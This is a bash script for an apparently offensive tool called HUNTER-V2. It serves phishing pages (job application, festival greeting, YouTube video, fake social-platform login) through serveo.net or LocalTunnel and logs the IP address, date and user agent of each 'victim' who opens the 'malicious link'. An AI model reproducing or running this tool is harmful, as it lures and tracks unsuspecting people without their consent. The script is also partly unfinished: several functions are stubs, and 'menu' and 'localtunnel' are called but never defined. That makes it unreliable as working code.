#!/bin/bash

__NAME__="HUNTER-V2"
__VERSION__="2.0"
__AUTHOR__="ATHEX"

### Script termination
trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Terminated!";loading;redirection;printf "\033[0m";exit 1' SIGINT
trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Interrupted!";loading;redirection;printf "\033[0m";exit 1' SIGTERM
trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Suspended!";suspend_script;printf "\033[0m";exit 1' SIGTSTP

# Initialize variables to avoid "unbound variable" errors
temp=""
mal_link=""
festName=""
subdomain=""
videoID=""
platformName=""
platformURL=""

# Detect OS and package manager
detect_os() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
    elif type uname >/dev/null 2>&1; then
        OS=$(uname -s)
    else
        OS="unknown"
    fi
    
    case $OS in
        kali|ubuntu|debian|parrot)
            PKG_MANAGER="apt"
            ;;
        arch|manjaro)
            PKG_MANAGER="pacman"
            ;;
        fedora|centos|rhel)
            PKG_MANAGER="yum"
            ;;
        darwin|macos)
            PKG_MANAGER="brew"
            ;;
        *)
            PKG_MANAGER="unknown"
            ;;
    esac
}

detect_os

function Desktop()
{
    printf "\033[1;33m                             CREATED  BY ~ \033[1;37mA T H E X\033[1;33m ~\n"
    printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
    printf "    ######## # ###### ###### # # ###### ######## ######## ######## ########     \n"
    printf "    ######## #  ##  # #  ##  # #  ##  # #      # #      # #      # ########     \n"
    printf "    ######## #  ##  # #  ##  # #   #  # ###  ### #  ##### #  ##  # ########     \n"
    printf "    ######## #      # #  ##  # #      # ###  ### #    ### #  ##  # ########     \n"
    printf "    ######## #  ##  # #  ##  # #  ##  # ###  ### #  ##### #     ## ########     \n"
    printf "    ######## #  ##  # ##    ## #  ##  # ###  ### #      # #  ##  # ########     \n"
    printf "    ######## #####  # ######## ###### # #### ### ######## ######## ########     \n"
    printf "    ######## ###### # ####### ##### \033[1;37m\033[4;1mv[$__VERSION__]\033[0m\033[1;33m ####  \n"
    printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
    printf "    ######## ######## \033[1;37m\033[4;1mhttps://athex-software-house.netlify.app\033[0m\033[1;33m########\n"
    printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
    printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
    printf "\033[0m\n"
}                           

function Android()
{
    printf "\033[1;33m  CREATED BY \033[1;37mATHEX\033[1;33m\n"
    printf "         /\  ____  __/|  ________\033[1;37mv\033[4;1m[$__VERSION__]\033[0m\033[1;33m__ \n"
    printf "        / / / / / / / | / /_  __/ ____/ __ \ \n"
    printf "       / /_/ / / / /  |/ / / / / __/ / /_/ / \n"
    printf "      / __  / /_/ / /|  / / / / /___/ _, _/  \n"
    printf "     /_/ / /\____/_/ | / / / /_____/_/ |_|   \n"
    printf "         \/          |/  \/                  \n"
    printf "\033[1;37m\033[4;1mhttps://instagram/itx_athex86/\033[0m  \n"
    printf "\033[0m\n"
}

function banner(){
    arch=$(uname -a | grep -o 'arm' | head -n1)
    arch2=$(uname -a | grep -o 'Android' | head -n1)
    arch3=$(uname -a | grep -o 'aarch64' | head -n1)
    arch4=$(uname -a | grep -o 'Darwin' | head -n1)

    if [[ $arch == *'arm'* || $arch2 == *'Android'* && $arch4 != *'Darwin'* ]] ; then
        Android
    else
        Desktop
    fi
}

function loading()
{
    dot=(. . .)
    for i in "${dot[@]}"
    do
        printf "$i"
        sleep 1
    done
    echo -e "\033[1;77m"
    sleep 1
}

function kill_Processors() 
{
    # Kill processes more reliably
    pkill -f "lt --port" > /dev/null 2>&1
    pkill -f "php -S" > /dev/null 2>&1
    pkill -f "ssh -o StrictHostKeyChecking" > /dev/null 2>&1
    
    # Additional cleanup for any leftover processes
    if command -v lsof >/dev/null 2>&1; then
        for port in 31301 8080; do
            lsof -ti:$port | xargs kill -9 > /dev/null 2>&1
        done
    fi
    
    # Kill by process name as fallback
    killall -9 php lt ssh > /dev/null 2>&1
}

function install_LT()
{
    read -p $'\n\033[1;33m[\033[1;37m++\033[1;33m] Press [\033[1;37mEnter\033[1;33m] to start the installation process, otherwise type (n/No): \033[1;37m' act
    if [[ $act == "n" || $act == "no" || $act == "N" || $act == "No" || $act == "NO" ]]; then
        printf "\n\033[1;33m[\033[1;37m++\033[1;33m] Note that the LocalTunnel can't be use because you denied the installation.\n"
        redirection
    fi

    # Check for Node.js or install it
    if ! command -v npm > /dev/null 2>&1; then
        printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Installing node.js on this machine"
        loading
        
        case $PKG_MANAGER in
            apt)
                apt update && apt install -y nodejs npm > /dev/null 2>&1 || {
                    printf "\033[1;33m[\033[1;37m++\033[1;33m] Failed to install Node.js with apt\n"
                    printf "\033[1;33m[\033[1;37m++\033[1;33m] Try: sudo apt update && sudo apt install nodejs npm\n"
                    exit 1
                }
                ;;
            pacman)
                pacman -Syu --noconfirm nodejs npm > /dev/null 2>&1 || {
                    printf "\033[1;33m[\033[1;37m++\033[1;33m] Failed to install Node.js with pacman\n"
                    exit 1
                }
                ;;
            yum)
                yum install -y nodejs npm > /dev/null 2>&1 || {
                    printf "\033[1;33m[\033[1;37m++\033[1;33m] Failed to install Node.js with yum\n"
                    exit 1
                }
                ;;
            brew)
                brew install node > /dev/null 2>&1 || {
                    printf "\033[1;33m[\033[1;37m++\033[1;33m] Failed to install Node.js with brew\n"
                    exit 1
                }
                ;;
            *)
                printf "\033[1;33m[\033[1;37m++\033[1;33m] Cannot determine package manager. Please install Node.js manually.\n"
                exit 1
                ;;
        esac
    fi
    
    sleep 2
    printf "\033[1;37m[\033[1;33m++\033[1;37m] Installing LocalTunnel using node.js"
    loading
    
    npm install -g localtunnel > /dev/null 2>&1 || { 
        printf "\033[1;33m[\033[1;37m++\033[1;33m] LocalTunnel installation failed!\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Trying with sudo...\n"
        sudo npm install -g localtunnel > /dev/null 2>&1 || {
            printf "\033[1;33m[\033[1;37m++\033[1;33m] LocalTunnel installation completely failed\n"
            printf "\033[1;33m[\033[1;37m++\033[1;33m] Please install manually: npm install -g localtunnel\n"
            exit 1
        }
    }
    sleep 2
    
    printf "\033[1;33m[\033[1;37m++\033[1;33m] LocalTunnel was installed successfully\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Now you can use LocalTunnel server for your attack.\n"
    redirection
}

function suspend_script()
{
    printf "\n\033[1;33m[\033[1;37m++\033[1;33m] Type '\033[1;37mbg\033[1;33m' or '\033[1;37mfg\033[1;33m' to continue from where you stop\033[1;37m\n"
    printf "\n\033[1;33m[\033[1;37m++\033[1;33m] For more information regarding this tool\033[1;37m\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Please contact the author at \033[1;37mathexithouse@gmail.com\033[1;37m\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Also follow us on github, star and fork this hacking tool\033[1;37m\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Thanks for using \033[1;37mHUNTER\033[1;33m! Happy hunting victims info\033[1;37m"
    loading
    Athexhacker="https://github.com/Athexhacker/HUNTER-V2" 
    if command -v xdg-open > /dev/null 2>&1; then
        xdg-open "$Athexhacker" > /dev/null 2>&1 &
    elif command -v open > /dev/null 2>&1; then
        open "$Athexhacker" > /dev/null 2>&1 &
    fi
    echo ""
}

function redirection() 
{
    kill_Processors 
    printf "\n\033[1;33m[\033[1;37m++\033[1;33m] For more information regarding this tool\033[1;37m\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Please contact the author at \033[1;37mathexithouse@gmail.com\033[1;37m\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Also follow us on github, star and fork this hacking tool\033[1;37m\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Thanks for using \033[1;37mHUNTER\033[1;33m! Happy hunting victims info\033[1;37m"
    loading
    Athexhacker="https://github.com/Athexhacker/HUNTER-V2" 
    if command -v xdg-open > /dev/null 2>&1; then
        xdg-open "$Athexhacker" > /dev/null 2>&1 &
    elif command -v open > /dev/null 2>&1; then
        open "$Athexhacker" > /dev/null 2>&1 &
    fi
    echo ""
}

function catch_victims() 
{
    printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Waiting for victims, Press Ctrl+C to quit"
    loading
    sleep 1

    local ip=""
    local d=""
    local agent=""
    local victims=""

    while true; do
        trap "break" INT
        
        if [[ -e "ip.txt" ]]; then
            t=$(grep -a 'time' ip.txt | cut -d "=" -f 2 | tr -d '\r')
            d=$(grep -a 'date' ip.txt | cut -d "=" -f 2 | tr -d '\r')
            ip=$(grep -a 'ip' ip.txt | cut -d "=" -f 2 | tr -d '\r')
            agent=$(grep -a 'agent' ip.txt | cut -d "=" -f 2 | tr -d '\r')

            if [[ -n "$ip" && -n "$d" ]]; then
                if [[ -d "$ip/$d" ]]; then
                    cat ip.txt >> "$ip/$d/victim_Info.txt"
                else
                    mkdir -p "$ip/$d"
                    cat ip.txt >> "$ip/$d/victim_Info.txt"
                fi
            fi
            rm -rf ip.txt

            if [[ -n "$ip" ]]; then
                printf "\n\033[1;32m[\033[1;37m√√\033[1;32m] Victims successfully visited our malicious link!"
                loading
                printf "   \033[1;33mTime: \033[1;37m%s\n" "$t" 
                printf "   \033[1;33mDate: \033[1;37m%s\n" "$d"
                printf "   \033[1;33mVictims IP: \033[1;37m%s\n" "$ip" 
            fi
        fi

        sleep 0.5
        
        # ... rest of the catch_victims function remains mostly the same
        # but with proper variable quoting like above
        
        sleep 0.5
    done

    trap - INT
    kill_Processors

    # Restore traps
    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Terminated!";loading;redirection;printf "\033[0m";exit 1' SIGINT
    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Interrupted!";loading;redirection;printf "\033[0m";exit 1' SIGTERM
    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Suspended!";suspend_script;printf "\033[0m";exit 1' SIGTSTP

    dir="$ip/$d/victim_Info.txt"
    if [[ -n "$ip" ]]; then
        if [[ -n "$agent" ]]; then
            printf "   \033[1;33m\nVictims User Agent: \033[1;37m%s\n" "$agent"
        else
            printf "\n\033[1;33m[\033[1;37m++\033[1;33m] User Agent not found in victims browser\n"
        fi
        printf "\n\033[1;33m[\033[1;37m++\033[1;33m] All information hunted from \033[1;37m$victims\033[1;33m by name, \033[1;37m$ip\033[1;33m by IP address\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Has been saved in \033[1;37m$dir\033[1;33m path\n"
    else
        printf "\n\033[1;33m[\033[1;37m++\033[1;33m] No information was hunted from victims!\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Make sure you sent the generated malicious link to victim\n"
    fi

    redirection
    exit 0
}

function template()
{
    default_temp='1'
    printf "\n\033[1;37m-------\033[1;33mTemplate Served\033[1;37m-------\n\n"    
    printf "   \033[1;33m[\033[1;37m01\033[1;33m] Applicant Form\n"
    printf "   \033[1;33m[\033[1;37m02\033[1;33m] Festival Wishing\n"
    printf "   \033[1;33m[\033[1;37m03\033[1;33m] Live Youtube Video\n"
    printf "   \033[1;33m[\033[1;37m04\033[1;33m] Custom Social Platform\n\n"
    read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Choose a Template to Use [\033[1;37mDefault is 1\033[1;33m]:\033[1;37m ' temp
    
    if [[ -z "$temp" ]]; then
        temp=$default_temp
    fi
    
    # Convert to number for comparison
    temp_num=$(echo "$temp" | sed 's/[^0-9]*//g')
    
    if [[ $temp_num -gt 4 ]] || [[ $temp_num -lt 1 ]]; then
        printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Invalid Template Option!\n"
        printf '\033[1;31m[\033[1;37m!!\033[1;31m] Please Try Again.\033[0m\n'
        sleep 2
        template
        return
    fi

    temp=$temp_num

    if [[ $temp == 2 ]]; then
        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Enter Festival Name:\033[1;37m ' festName
        festName="${festName//[[:space:]]/}"
        while [[ -z "$festName" ]]
        do
            printf '\033[1;31m[\033[1;37m!!\033[1;31m] Festival Name cannot be empty.\033[0m\n'
            sleep 1
            read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Re-enter Festival Name:\033[1;37m ' festName
            festName="${festName//[[:space:]]/}"
        done
        subdomain="happy-$festName-seasson=$RANDOM"
        
    elif [[ $temp == 3 ]]; then
        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Enter YouTube Video ID:\033[1;37m ' videoID
        videoID="${videoID//[[:space:]]/}"
        while [[ -z "$videoID" ]]
        do
            printf '\033[1;31m[\033[1;37m!!\033[1;31m] YouTube Video ID cannot be empty.\033[0m\n'
            sleep 1
            read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Re-enter YouTube Video ID:\033[1;37m ' videoID
            videoID="${videoID//[[:space:]]/}"
        done
        subdomain="youtubevideo=$videoID-$RANDOM"
        
    elif [[ $temp == 1 ]]; then
        subdomain="jobapplicationform-$RANDOM"
        
    elif [[ $temp == 4 ]]; then
        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Enter Platform Name:\033[1;37m ' platformName
        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Copy and Paste "'$platformName'" Login URL:\033[1;37m ' platformURL
        platformName="${platformName//[[:space:]]/}"
        while [[ -z "$platformName" || -z "$platformURL" ]]
        do
            printf '\033[1;31m[\033[1;37m!!\033[1;31m] Platform Name and Login URL cannot be empty.\033[0m\n'
            sleep 1
            read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Re-enter Platform Name:\033[1;37m ' platformName
            read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Re-copy and Re-paste Login URL:\033[1;37m ' platformURL
            platformName="${platformName//[[:space:]]/}"
        done
        subdomain="$platformName-$RANDOM"
    fi
    
    sleep 1
}

function templateSetup()
{
    printf "\033[1;37m[\033[1;33m++\033[1;37m] Preparing template for the attack"
    loading
    sleep 2

    # Create necessary directories if they don't exist
    mkdir -p templates
    
    # Template setup logic here...
    # Note: You need to ensure the template files exist
    printf '\n\033[1;32m[\033[1;37m√√\033[1;32m] Malicious link:\033[1;37m %s\033[1;37m\n' "$mal_link"
    sleep 2
    catch_victims
}

function localhost() 
{   
    if ! command -v php > /dev/null 2>&1; then
        printf "\033[1;33m[\033[1;37m++\033[1;33m] PHP is not installed!\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Attempting to install...\n"
        
        case $PKG_MANAGER in
            apt)
                sudo apt update && sudo apt install -y php > /dev/null 2>&1 || {
                    printf "\033[1;31m[!!] Failed to install PHP. Please install manually.\n"
                    exit 1
                }
                ;;
            pacman)
                sudo pacman -S --noconfirm php > /dev/null 2>&1 || exit 1
                ;;
            yum)
                sudo yum install -y php > /dev/null 2>&1 || exit 1
                ;;
            brew)
                brew install php > /dev/null 2>&1 || exit 1
                ;;
            *)
                printf "\033[1;31m[!!] Cannot install PHP automatically. Please install manually.\n"
                exit 1
                ;;
        esac
    fi

    addr="127.0.0.1:31301"
    printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting PHP server"
    loading
    
    # Kill any process on the port
    if command -v lsof >/dev/null 2>&1; then
        lsof -ti:31301 | xargs kill -9 > /dev/null 2>&1
    else
        # Fallback for systems without lsof
        fuser -k 31301/tcp > /dev/null 2>&1
    fi
    
    # Start PHP server in background
    php -S "$addr" > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 3

    printf "\033[1;37m[\033[1;33m++\033[1;37m] Generating malicious link"
    loading
    
    mal_link="http://$addr"
    
    templateSetup
}

# ... Other functions (serveo, localtunnel, localXposer) need similar fixes
# but due to length, I'll show the pattern for one more:

function serveo() 
{   
    # Check for PHP
    if ! command -v php > /dev/null 2>&1; then
        printf "\033[1;33m[\033[1;37m++\033[1;33m] PHP is not installed!\n"
        case $PKG_MANAGER in
            apt) sudo apt install -y php ;;
            # ... other package managers
        esac
    fi
    
    # Check for SSH
    if ! command -v ssh > /dev/null 2>&1; then
        printf "\033[1;33m[\033[1;37m++\033[1;33m] SSH is not installed!\n"
        case $PKG_MANAGER in
            apt) sudo apt install -y openssh-client ;;
            # ... other package managers
        esac
    fi

    printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting PHP"
    loading
    
    # Kill any existing PHP server on port 31301
    if command -v lsof >/dev/null 2>&1; then
        lsof -ti:31301 | xargs kill -9 > /dev/null 2>&1
    fi
    
    php -S localhost:31301 > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 3

    printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting serveo.net"
    loading
    
    # Clean up old files
    rm -f sshError maliciouslink 2>/dev/null
    
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:31301 serveo.net 2> sshError > maliciouslink &
    SSH_PID=$!
    sleep 10  # Increased wait time for SSH connection

    if [[ -e "sshError" ]]; then
        if grep -q "Connection refused" sshError; then
            printf '\n\033[1;31m[--] SSH connection failed!\n'
            printf '    Try: sudo service ssh start\n'
        elif grep -q "Could not resolve hostname" sshError; then
            printf '\n\033[1;31m[--] Cannot resolve serveo.net!\n'
            printf '    Check your internet connection.\n'
        fi
        rm -f sshError maliciouslink
        kill $PHP_PID 2>/dev/null
        exit 1
    fi
    
    printf "\033[1;37m[\033[1;33m++\033[1;37m] Generating malicious link"
    loading
    sleep 5

    if [[ -s "maliciouslink" ]]; then
        mal_link=$(grep -o "https://[a-z0-9A-Z.-]*\.serveo\.net" maliciouslink | head -n 1)
        if [[ -z "$mal_link" ]]; then
            mal_link=$(grep -o "https://.*" maliciouslink | head -n 1)
        fi
        rm -f maliciouslink
    else
        printf "\n\n\033[1;31m[--] Failed to generate link. Check internet connection.\n"
        rm -f maliciouslink
        kill $PHP_PID $SSH_PID 2>/dev/null
        exit 1
    fi
    
    if [[ -z "$mal_link" ]]; then
        printf "\n\033[1;31m[--] Could not extract malicious link\n"
        exit 1
    fi
    
    templateSetup
}

function tunnel()
{
    default_server="1"
    printf "\n\033[1;37m-------\033[1;33mTunnel Servers\033[1;37m-------\n\n"    
    printf "   \033[1;33m[\033[1;37m01\033[1;33m] Localhost\n"
    printf "   \033[1;33m[\033[1;37m02\033[1;33m] Serveo.Net\n"
    printf "   \033[1;33m[\033[1;37m03\033[1;33m] LocalTunnel\n"
    printf "   \033[1;33m[\033[1;37m04\033[1;33m] Localhost.Run\n\n"
    read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Choose Port Forwarding [\033[1;37mDefault is 1\033[1;33m]:\033[1;37m ' server
    
    if [[ -z "$server" ]]; then
        server=$default_server
    fi
    
    server_num=$(echo "$server" | sed 's/[^0-9]*//g')
    
    template

    case $server_num in
        1)
            localhost
            ;;
        2)
            serveo
            ;;
        3)
            localtunnel
            ;;
        4)
            localXposer
            ;;
        *)
            printf "\n\033[1;31m[!!] Invalid option, try again!\033[0m\n"
            sleep 1
            tunnel
            ;;
    esac
}

function updateUS()
{
    printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Checking for updates..."
    loading
    
    # Implementation depends on how you want to update
    printf "\033[1;33m[++] Update feature to be implemented\n"
    sleep 2
    menu
}

function hunter()
{
    clear
    sleep 1
    kill_Processors
    banner
    menu
}

# Start the script
hunter
